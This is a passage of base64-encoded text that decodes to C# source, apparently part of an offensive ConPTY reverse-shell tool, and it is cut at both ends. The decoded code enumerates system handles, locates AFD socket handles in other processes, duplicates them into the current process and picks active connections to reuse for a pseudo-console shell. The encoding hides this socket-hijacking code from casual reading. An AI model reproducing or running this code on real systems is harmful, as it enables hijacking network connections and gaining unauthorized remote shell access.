gIHB1YmxpYyBVSW50MzIgU2l6ZU9mSGVscGVyRGF0YTsKICAgICAgICBwdWJsaWMgVUludDMyIFBhZGRpbmc7CiAgICAgICAgcHVibGljIFNPQ0tBRERSIExvY2FsQWRkcmVzczsKICAgICAgICBwdWJsaWMgU09DS0FERFIgUmVtb3RlQWRkcmVzczsKICAgICAgICAvLyBIZWxwZXIgRGF0YSAtIGZvdW5kIG91dCB3aXRoIHNvbWUgcmV2ZXJzaW5nCiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdCA9IDI0KV0KICAgICAgICBwdWJsaWMgYnl0ZVtdIEhlbHBlckRhdGE7CiAgICB9CgogICAgcHJpdmF0ZSBzdHJ1Y3QgU09DS0VUX0JZVEVTSU4KICAgIHsKICAgICAgICBwdWJsaWMgSW50UHRyIGhhbmRsZTsKICAgICAgICBwdWJsaWMgVUludDY0IEJ5dGVzSW47CiAgICB9CgoKICAgIFtEbGxJbXBvcnQoIldTMl8zMi5ETEwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgV1NBRHVwbGljYXRlU29ja2V0KEludFB0ciBzb2NrZXRIYW5kbGUsIGludCBwcm9jZXNzSWQsIHJlZiBXU0FQUk9UT0NPTF9JTkZPIHBpbm5lZEJ1ZmZlcik7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUsIENhbGxpbmdDb252ZW50aW9uID0gQ2FsbGluZ0NvbnZlbnRpb24uU3RkQ2FsbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIFdTQVNvY2tldChbSW5dIGludCBhZGRyZXNzRmFtaWx5LCBbSW5dIGludCBzb2NrZXRUeXBlLCBbSW5dIGludCBwcm90b2NvbFR5cGUsIHJlZiBXU0FQUk9UT0NPTF9JTkZPIGxwUHJvdG9jb2xJbmZvLCBJbnQzMiBncm91cDEsIGludCBkd0ZsYWdzKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50MzIgV1NBR2V0TGFzdEVycm9yKCk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUsIENhbGxpbmdDb252ZW50aW9uID0gQ2FsbGluZ0NvbnZlbnRpb24uU3RkQ2FsbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IGdldHBlZXJuYW1lKEludFB0ciBzLCByZWYgU09DS0FERFJfSU4gbmFtZSwgcmVmIGludCBuYW1lbGVuKTsKCiAgICAvLyBXU0FJb2N0bDEgaW1wbGVtZW50YXRpb24gc3BlY2lmaWMgZm9yIFNJT19UQ1BfSU5GTyBjb250cm9sIGNvZGUKICAgIFtEbGxJbXBvcnQoIldzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFbnRyeVBvaW50ID0gIldTQUlvY3RsIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgV1NBSW9jdGwxKEludFB0ciBzLCBpbnQgZHdJb0NvbnRyb2xDb2RlLCByZWYgVUludDMyIGxwdkluQnVmZmVyLCBpbnQgY2JJbkJ1ZmZlciwgSW50UHRyIGxwdk91dEJ1ZmZlciwgaW50IGNiT3V0QnVmZmVyLCByZWYgaW50IGxwY2JCeXRlc1JldHVybmVkLCBJbnRQdHIgbHBPdmVybGFwcGVkLCBJbnRQdHIgbHBDb21wbGV0aW9uUm91dGluZSk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBjbG9zZXNvY2tldChJbnRQdHIgcyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5Qcm9jZXNzKGludCBwcm9jZXNzQWNjZXNzLCBib29sIGJJbmhlcml0SGFuZGxlLCBpbnQgcHJvY2Vzc0lkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRHVwbGljYXRlSGFuZGxlKEludFB0ciBoU291cmNlUHJvY2Vzc0hhbmRsZSwgSW50UHRyIGhTb3VyY2VIYW5kbGUsIEludFB0ciBoVGFyZ2V0UHJvY2Vzc0hhbmRsZSwgb3V0IEludFB0ciBscFRhcmdldEhhbmRsZSwgdWludCBkd0Rlc2lyZWRBY2Nlc3MsIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0gYm9vbCBiSW5oZXJpdEhhbmRsZSwgdWludCBkd09wdGlvbnMpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwoKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRRdWVyeU9iamVjdChJbnRQdHIgb2JqZWN0SGFuZGxlLCBPQkpFQ1RfSU5GT1JNQVRJT05fQ0xBU1MgaW5mb3JtYXRpb25DbGFzcywgSW50UHRyIGluZm9ybWF0aW9uUHRyLCB1aW50IGluZm9ybWF0aW9uTGVuZ3RoLCByZWYgaW50IHJldHVybkxlbmd0aCk7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oaW50IFN5c3RlbUluZm9ybWF0aW9uQ2xhc3MsIEludFB0ciBTeXN0ZW1JbmZvcm1hdGlvbiwgaW50IFN5c3RlbUluZm9ybWF0aW9uTGVuZ3RoLCByZWYgaW50IHJldHVybkxlbmd0aCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFVJbnQzMiBkd01pbGxpc2Vjb25kcyk7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IE50Q3JlYXRlRXZlbnQocmVmIEludFB0ciBFdmVudEhhbmRsZSwgaW50IERlc2lyZWRBY2Nlc3MsIEludFB0ciBPYmplY3RBdHRyaWJ1dGVzLCBpbnQgRXZlbnRUeXBlLCBib29sIEluaXRpYWxTdGF0ZSk7CgogICAgLy8gTnREZXZpY2VJb0NvbnRyb2xGaWxlMSBpbXBsZW1lbnRhdGlvbiBzcGVjaWZpYyBmb3IgSU9DVExfQUZEX0dFVF9DT05URVhUIElvQ29udHJvbENvZGUKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIEVudHJ5UG9pbnQgPSAiTnREZXZpY2VJb0NvbnRyb2xGaWxlIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IE50RGV2aWNlSW9Db250cm9sRmlsZTEoSW50UHRyIEZpbGVIYW5kbGUsIEludFB0ciBFdmVudCwgSW50UHRyIEFwY1JvdXRpbmUsIEludFB0ciBBcGNDb250ZXh0LCByZWYgSU9fU1RBVFVTX0JMT0NLIElvU3RhdHVzQmxvY2ssIHVpbnQgSW9Db250cm9sQ29kZSwgSW50UHRyIElucHV0QnVmZmVyLCBpbnQgSW5wdXRCdWZmZXJMZW5ndGgsIHJlZiBTT0NLRVRfQ09OVEVYVCBPdXRwdXRCdWZmZXIsIGludCBPdXRwdXRCdWZmZXJMZW5ndGgpOwoKICAgIFtEbGxJbXBvcnQoIldzMl8zMi5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBpb2N0bHNvY2tldChJbnRQdHIgcywgaW50IGNtZCwgcmVmIGludCBhcmdwKTsKICAgIAogICAgLy9oZWxwZXIgbWV0aG9kIHdpdGggImR5bmFtaWMiIGJ1ZmZlciBhbGxvY2F0aW9uCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uRHluYW1pYyhpbnQgaW5mb0NsYXNzLCBpbnQgaW5mb0xlbmd0aCkKICAgIHsKICAgICAgICBpZiAoaW5mb0xlbmd0aCA9PSAwKQogICAgICAgICAgICBpbmZvTGVuZ3RoID0gMHgxMDAwMDsKICAgICAgICBJbnRQdHIgaW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGluZm9MZW5ndGgpOwogICAgICAgIHdoaWxlICh0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgdWludCByZXN1bHQgPSAodWludClOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oaW5mb0NsYXNzLCBpbmZvUHRyLCBpbmZvTGVuZ3RoLCByZWYgaW5mb0xlbmd0aCk7CiAgICAgICAgICAgIGluZm9MZW5ndGggPSBpbmZvTGVuZ3RoICogMjsKICAgICAgICAgICAgaWYgKHJlc3VsdCA9PSBOVFNUQVRVU19TVUNDRVNTKQogICAgICAgICAgICAgICAgcmV0dXJuIGluZm9QdHI7CiAgICAgICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwoaW5mb1B0cik7ICAvL2ZyZWUgcG9pbnRlciB3aGVuIG5vdCBTdWNjZXNzZnVsCiAgICAgICAgICAgIGlmIChyZXN1bHQgIT0gTlRTVEFUVVNfSU5GT0xFTkdUSE1JU01BVENIICYmIHJlc3VsdCAhPSBOVFNUQVRVU19CVUZGRVJPVkVSRkxPVyAmJiByZXN1bHQgIT0gTlRTVEFUVVNfQlVGRkVSVE9PU01BTEwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vdGhyb3cgbmV3IEV4Y2VwdGlvbigiVW5oYW5kbGVkIE50U3RhdHVzICIgKyByZXN1bHQpOwogICAgICAgICAgICAgICAgcmV0dXJuIEludFB0ci5aZXJvOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGluZm9QdHIgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChpbmZvTGVuZ3RoKTsKICAgICAgICB9CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgSW50UHRyIFF1ZXJ5T2JqZWN0VHlwZXNJbmZvKCkKICAgIHsKICAgICAgICBJbnRQdHIgcHRyT2JqZWN0VHlwZXNJbmZvcm1hdGlvbiA9IEludFB0ci5aZXJvOwogICAgICAgIHB0ck9iamVjdFR5cGVzSW5mb3JtYXRpb24gPSBOdFF1ZXJ5T2JqZWN0RHluYW1pYyhJbnRQdHIuWmVybywgT0JKRUNUX0lORk9STUFUSU9OX0NMQVNTLk9iamVjdEFsbFR5cGVzSW5mb3JtYXRpb24sIDApOwogICAgICAgIHJldHVybiBwdHJPYmplY3RUeXBlc0luZm9ybWF0aW9uOwogICAgfQoKICAgIC8vIHRoaXMgZnJvbSAtLT4gaHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01FL2Jsb2IvbWFzdGVyL1NvdXJjZS9TaGFyZWQvbnRvcy5oCiAgICBwcml2YXRlIHN0YXRpYyBsb25nIEFsaWduVXAobG9uZyBhZGRyZXNzLCBsb25nIGFsaWduKQogICAgewogICAgICAgIHJldHVybiAoKChhZGRyZXNzKSArIChhbGlnbikgLSAxKSAmIH4oKGFsaWduKSAtIDEpKTsKICAgIH0KCiAgICAvLyB0aGlzIHdvcmtzIG9ubHkgZnJvbSB3aW44IGFuZCBhYm92ZS4gSWYgeW91IG5lZWQgYSBtb3JlIGdlbmVyaWMgc29sdXRpb24geW91IG5lZWQgdG8gdXNlIHRoZSAoaSsyKSAid2F5IiBvZiBjb3VudGluZyBpbmRleCB0eXBlcy4KICAgIC8vIGNyZWRpdHMgZm9yIHRoaXMgZ29lcyB0byBAMHhyZXBuegogICAgLy8gbW9yZSBpbmZvcm1hdGlvbiBoZXJlIC0tPiBodHRwczovL3R3aXR0ZXIuY29tL3NwbGludGVyX2NvZGUvc3RhdHVzLzE0MDA4NzMwMDkxMjEwMTM3NjUKICAgIHByaXZhdGUgc3RhdGljIGJ5dGUgR2V0VHlwZUluZGV4QnlOYW1lKHN0cmluZyBPYmplY3ROYW1lKQogICAgewogICAgICAgIGJ5dGUgVHlwZUluZGV4ID0gMDsKICAgICAgICBsb25nIFR5cGVzQ291bnQgPSAwOwogICAgICAgIEludFB0ciBwdHJUeXBlc0luZm8gPSBJbnRQdHIuWmVybzsKICAgICAgICBwdHJUeXBlc0luZm8gPSBRdWVyeU9iamVjdFR5cGVzSW5mbygpOwogICAgICAgIFR5cGVzQ291bnQgPSBNYXJzaGFsLlJlYWRJbnRQdHIocHRyVHlwZXNJbmZvKS5Ub0ludDY0KCk7CiAgICAgICAgLy8gY3JlYXRlIGEgcG9pbnRlciB0byB0aGUgZmlyc3QgZWxlbWVudCBhZGRyZXNzIG9mIE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyCiAgICAgICAgSW50UHRyIHB0clR5cGVzSW5mb0N1cnJlbnQgPSBuZXcgSW50UHRyKHB0clR5cGVzSW5mby5Ub0ludDY0KCkgKyBJbnRQdHIuU2l6ZSk7CiAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBUeXBlc0NvdW50OyBpKyspCiAgICAgICAgewogICAgICAgICAgICBPQkpFQ1RfVFlQRV9JTkZPUk1BVElPTl9WMiBUeXBlID0gKE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyKU1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUocHRyVHlwZXNJbmZvQ3VycmVudCwgdHlwZW9mKE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyKSk7CiAgICAgICAgICAgIC8vIG1vdmUgcG9pbnRlciB0byBuZXh0IHRoZSBPQkpFQ1RfVFlQRV9JTkZPUk1BVElPTl9WMiBvYmplY3QKICAgICAgICAgICAgcHRyVHlwZXNJbmZvQ3VycmVudCA9IChJbnRQdHIpKHB0clR5cGVzSW5mb0N1cnJlbnQuVG9JbnQ2NCgpICsgQWxpZ25VcChUeXBlLlR5cGVOYW1lLk1heGltdW1MZW5ndGgsIChsb25nKUludFB0ci5TaXplKSArIE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihPQkpFQ1RfVFlQRV9JTkZPUk1BVElPTl9WMikpKTsKICAgICAgICAgICAgaWYgKFR5cGUuVHlwZU5hbWUuTGVuZ3RoID4gMCAmJiBNYXJzaGFsLlB0clRvU3RyaW5nVW5pKFR5cGUuVHlwZU5hbWUuQnVmZmVyLCBUeXBlLlR5cGVOYW1lLkxlbmd0aCAvIDIpID09IE9iamVjdE5hbWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFR5cGVJbmRleCA9IFR5cGUuVHlwZUluZGV4OwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChwdHJUeXBlc0luZm8pOwogICAgICAgIHJldHVybiBUeXBlSW5kZXg7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgTGlzdDxJbnRQdHI+IER1cGxpY2F0ZVNvY2tldHNGcm9tSGFuZGxlcyhMaXN0PEludFB0cj4gc29ja2V0cykKICAgIHsKICAgICAgICBMaXN0PEludFB0cj4gZHVwZWRTb2NrZXRzT3V0ID0gbmV3IExpc3Q8SW50UHRyPigpOwogICAgICAgIGlmIChzb2NrZXRzLkNvdW50IDwgMSkgcmV0dXJuIGR1cGVkU29ja2V0c091dDsKICAgICAgICBmb3JlYWNoIChJbnRQdHIgc29jayBpbiBzb2NrZXRzKQogICAgICAgIHsKICAgICAgICAgICAgSW50UHRyIGR1cGVkU29ja2V0ID0gRHVwbGljYXRlU29ja2V0RnJvbUhhbmRsZShzb2NrKTsKICAgICAgICAgICAgaWYgKGR1cGVkU29ja2V0ICE9IEludFB0ci5aZXJvKSBkdXBlZFNvY2tldHNPdXQuQWRkKGR1cGVkU29ja2V0KTsKICAgICAgICB9CiAgICAgICAgLy8gY2xlYW5pbmcgYWxsIHNvY2tldCBoYW5kbGVzCiAgICAgICAgZm9yZWFjaCAoSW50UHRyIHNvY2sgaW4gc29ja2V0cykKICAgICAgICAgICAgQ2xvc2VIYW5kbGUoc29jayk7CiAgICAgICAgcmV0dXJuIGR1cGVkU29ja2V0c091dDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBMaXN0PEludFB0cj4gRmlsdGVyQW5kT3JkZXJTb2NrZXRzQnlCeXRlc0luKExpc3Q8SW50UHRyPiBzb2NrZXRzKQogICAgewogICAgICAgIExpc3Q8U09DS0VUX0JZVEVTSU4+IHNvY2tldHNCeXRlc0luID0gbmV3IExpc3Q8U09DS0VUX0JZVEVTSU4+KCk7CiAgICAgICAgTGlzdDxJbnRQdHI+IHNvY2tldHNPdXQgPSBuZXcgTGlzdDxJbnRQdHI+KCk7CiAgICAgICAgZm9yZWFjaCAoSW50UHRyIHNvY2sgaW4gc29ja2V0cykKICAgICAgICB7CiAgICAgICAgICAgIFRDUF9JTkZPX3YwIHNvY2tJbmZvID0gbmV3IFRDUF9JTkZPX3YwKCk7CiAgICAgICAgICAgIGlmICghR2V0U29ja2V0VGNwSW5mbyhzb2NrLCBvdXQgc29ja0luZm8pKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBjbG9zZXNvY2tldChzb2NrKTsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogU29ja2V0IGhhbmRsZSAweCIgKyBzb2NrLlRvU3RyaW5nKCJYNCIpICsgIiBpcyBpbiB0Y3BzdGF0ZSAiICsgc29ja0luZm8uU3RhdGUuVG9TdHJpbmcoKSk7CiAgICAgICAgICAgIC8vIHdlIG5lZWQgb25seSBhY3RpdmUgc29ja2V0cywgdGhlIHJlbWFpbmcgc29ja2V0cyBhcmUgZmlsdGVyZWQgb3V0CiAgICAgICAgICAgIGlmIChzb2NrSW5mby5TdGF0ZSA9PSBUY3BTdGF0ZS5TeW5SZWNlaXZlZCB8fCBzb2NrSW5mby5TdGF0ZSA9PSBUY3BTdGF0ZS5Fc3RhYmxpc2hlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU09DS0VUX0JZVEVTSU4gc29ja0J5dGVzSW4gPSBuZXcgU09DS0VUX0JZVEVTSU4oKTsKICAgICAgICAgICAgICAgIHNvY2tCeXRlc0luLmhhbmRsZSA9IHNvY2s7CiAgICAgICAgICAgICAgICBzb2NrQnl0ZXNJbi5CeXRlc0luID0gc29ja0luZm8uQnl0ZXNJbjsKICAgICAgICAgICAgICAgIHNvY2tldHNCeXRlc0luLkFkZChzb2NrQnl0ZXNJbik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgY2xvc2Vzb2NrZXQoc29jayk7CiAgICAgICAgfQogICAgICAgIGlmIChzb2NrZXRzQnl0ZXNJbi5Db3VudCA8IDEpIHJldHVybiBzb2NrZXRzT3V0OwogICAgICAgIGlmIChzb2NrZXRzQnl0ZXNJbi5Db3VudCA+PSAyKQogICAgICAgICAgICAvLyBvcmRlcmluZyBmb3IgZmV3ZXIgYnl0ZXMgcmVjZWl2ZWQgYnkgdGhlIHNvY2tldHMgd2UgaGF2ZSBhIGhpZ2hlciBjaGFuY2UgdG8gZ2V0IHRoZSBwcm9wZXIgc29ja2V0CiAgICAgICAgICAgIHNvY2tldHNCeXRlc0luLlNvcnQoZGVsZWdhdGUgKFNPQ0tFVF9CWVRFU0lOIGEsIFNPQ0tFVF9CWVRFU0lOIGIpIHsgcmV0dXJuIChhLkJ5dGVzSW4uQ29tcGFyZVRvKGIuQnl0ZXNJbikpOyB9KTsKICAgICAgICBmb3JlYWNoIChTT0NLRVRfQllURVNJTiBzb2NrQnl0ZXNJbiBpbiBzb2NrZXRzQnl0ZXNJbikKICAgICAgICB7CiAgICAgICAgICAgIHNvY2tldHNPdXQuQWRkKHNvY2tCeXRlc0luLmhhbmRsZSk7CiAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogU29ja2V0IGhhbmRsZSAweCIgKyBzb2NrQnl0ZXNJbi5oYW5kbGUuVG9TdHJpbmcoIlg0IikgKyAiIHRvdGFsIGJ5dGVzIHJlY2VpdmVkOiAiICsgc29ja0J5dGVzSW4uQnl0ZXNJbi5Ub1N0cmluZygpKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHNvY2tldHNPdXQ7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBHZXRTb2NrZXRUY3BJbmZvKEludFB0ciBzb2NrZXQsIG91dCBUQ1BfSU5GT192MCB0Y3BJbmZvT3V0KQogICAgewogICAgICAgIGludCByZXN1bHQgPSAtMTsKICAgICAgICBVSW50MzIgdGNwSW5mb1ZlcnNpb24gPSAwOwogICAgICAgIGludCBieXRlc1JldHVybmVkID0gMDsKICAgICAgICBpbnQgdGNwSW5mb1NpemUgPSBNYXJzaGFsLlNpemVPZih0eXBlb2YoVENQX0lORk9fdjApKTsKICAgICAgICBJbnRQdHIgdGNwSW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKHRjcEluZm9TaXplKTsKICAgICAgICByZXN1bHQgPSBXU0FJb2N0bDEoc29ja2V0LCBTSU9fVENQX0lORk8sIHJlZiB0Y3BJbmZvVmVyc2lvbiwgTWFyc2hhbC5TaXplT2YodGNwSW5mb1ZlcnNpb24pLCB0Y3BJbmZvUHRyLCB0Y3BJbmZvU2l6ZSwgcmVmIGJ5dGVzUmV0dXJuZWQsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybyk7CiAgICAgICAgaWYgKHJlc3VsdCAhPSAwKQogICAgICAgIHsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBXU0FJb2N0bDEgZmFpbGVkIHdpdGggcmV0dXJuIGNvZGUgIiArIHJlc3VsdC5Ub1N0cmluZygpICsgIiBhbmQgd3NhbGFzdGVycm9yOiAiICsgV1NBR2V0TGFzdEVycm9yKCkuVG9TdHJpbmcoKSk7CiAgICAgICAgICAgIHRjcEluZm9PdXQgPSBuZXcgVENQX0lORk9fdjAoKTsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBUQ1BfSU5GT192MCB0Y3BJbmZvVjAgPSAoVENQX0lORk9fdjApTWFyc2hhbC5QdHJUb1N0cnVjdHVyZSh0Y3BJbmZvUHRyLCB0eXBlb2YoVENQX0lORk9fdjApKTsKICAgICAgICB0Y3BJbmZvT3V0ID0gdGNwSW5mb1YwOwogICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwodGNwSW5mb1B0cik7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLy8gdGhpcyBmdW5jdGlvbiB0YWtlIGEgcmF3IGhhbmRsZSB0byBhIFxEZXZpY2VcQWZkIG9iamVjdCBhcyBhIHBhcmFtZXRlciBhbmQgcmV0dXJucyBhIGhhbmRsZSB0byBhIGR1cGxpY2F0ZWQgc29ja2V0CiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgRHVwbGljYXRlU29ja2V0RnJvbUhhbmRsZShJbnRQdHIgc29ja2V0SGFuZGxlKQogICAgewogICAgICAgIEludFB0ciByZXRTb2NrZXQgPSBJbnRQdHIuWmVybzsKICAgICAgICBJbnRQdHIgZHVwbGljYXRlZFNvY2tldCA9IEludFB0ci5aZXJvOwogICAgICAgIFdTQVBST1RPQ09MX0lORk8gd3NhUHJvdG9jb2xJbmZvID0gbmV3IFdTQVBST1RPQ09MX0lORk8oKTsKICAgICAgICBpbnQgc3RhdHVzID0gV1NBRHVwbGljYXRlU29ja2V0KHNvY2tldEhhbmRsZSwgUHJvY2Vzcy5HZXRDdXJyZW50UHJvY2VzcygpLklkLCByZWYgd3NhUHJvdG9jb2xJbmZvKTsKICAgICAgICBpZiAoc3RhdHVzID09IDApCiAgICAgICAgewogICAgICAgICAgICAvLyB3ZSBuZWVkIGFuIG92ZXJsYXBwZWQgc29ja2V0IGZvciB0aGUgY29ucHR5IHByb2Nlc3MgYnV0IHdlIGRvbid0IG5lZWQgdG8gc3BlY2lmeSB0aGUgV1NBX0ZMQUdfT1ZFUkxBUFBFRCBmbGFnIGhlcmUgYmVjYXVzZSBpdCB3aWxsIGJlIGlnbm9yZWQgKGFuZCBhdXRvbWF0aWNhbGx5IHNldCkgYnkgV1NBU29ja2V0KCkgZnVuY3Rpb24gaWYgd2Ugc2V0IHRoZSBXU0FQUk9UT0NPTF9JTkZPIHN0cnVjdHVyZSBhbmQgaWYgdGhlIG9yaWdpbmFsIHNvY2tldCBoYXMgYmVlbiBjcmVhdGVkIHdpdGggdGhlIG92ZXJsYXBwZWQgZmxhZy4KICAgICAgICAgICAgZHVwbGljYXRlZFNvY2tldCA9IFdTQVNvY2tldCh3c2FQcm90b2NvbEluZm8uaUFkZHJlc3NGYW1pbHksIHdzYVByb3RvY29sSW5mby5pU29ja2V0VHlwZSwgd3NhUHJvdG9jb2xJbmZvLmlQcm90b2NvbCwgcmVmIHdzYVByb3RvY29sSW5mbywgMCwgMCk7CiAgICAgICAgICAgIGlmIChkdXBsaWNhdGVkU29ja2V0LlRvSW50NjQoKSA+IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldFNvY2tldCA9IGR1cGxpY2F0ZWRTb2NrZXQ7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJldFNvY2tldDsKICAgIH0KCiAgICAvL2hlbHBlciBtZXRob2Qgd2l0aCAiZHluYW1pYyIgYnVmZmVyIGFsbG9jYXRpb24KICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyIE50UXVlcnlPYmplY3REeW5hbWljKEludFB0ciBoYW5kbGUsIE9CSkVDVF9JTkZPUk1BVElPTl9DTEFTUyBpbmZvQ2xhc3MsIGludCBpbmZvTGVuZ3RoKQogICAgewogICAgICAgIGlmIChpbmZvTGVuZ3RoID09IDApCiAgICAgICAgICAgIGluZm9MZW5ndGggPSBNYXJzaGFsLlNpemVPZih0eXBlb2YoaW50KSk7CiAgICAgICAgSW50UHRyIGluZm9QdHIgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChpbmZvTGVuZ3RoKTsKICAgICAgICB1aW50IHJlc3VsdDsKICAgICAgICB3aGlsZSAodHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgIHJlc3VsdCA9ICh1aW50KU50UXVlcnlPYmplY3QoaGFuZGxlLCBpbmZvQ2xhc3MsIGluZm9QdHIsICh1aW50KWluZm9MZW5ndGgsIHJlZiBpbmZvTGVuZ3RoKTsKICAgICAgICAgICAgaWYgKHJlc3VsdCA9PSBOVFNUQVRVU19JTkZPTEVOR1RITUlTTUFUQ0ggfHwgcmVzdWx0ID09IE5UU1RBVFVTX0JVRkZFUk9WRVJGTE9XIHx8IHJlc3VsdCA9PSBOVFNUQVRVU19CVUZGRVJUT09TTUFMTCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChpbmZvUHRyKTsKICAgICAgICAgICAgICAgIGluZm9QdHIgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbCgoaW50KWluZm9MZW5ndGgpOwogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAocmVzdWx0ID09IE5UU1RBVFVTX1NVQ0NFU1MpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAvL3Rocm93IG5ldyBFeGNlcHRpb24oIlVuaGFuZGxlZCBOdFN0YXR1cyAiICsgcmVzdWx0KTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChyZXN1bHQgPT0gTlRTVEFUVVNfU1VDQ0VTUykKICAgICAgICAgICAgcmV0dXJuIGluZm9QdHI7Ly9kb24ndCBmb3JnZXQgdG8gZnJlZSB0aGUgcG9pbnRlciB3aXRoIE1hcnNoY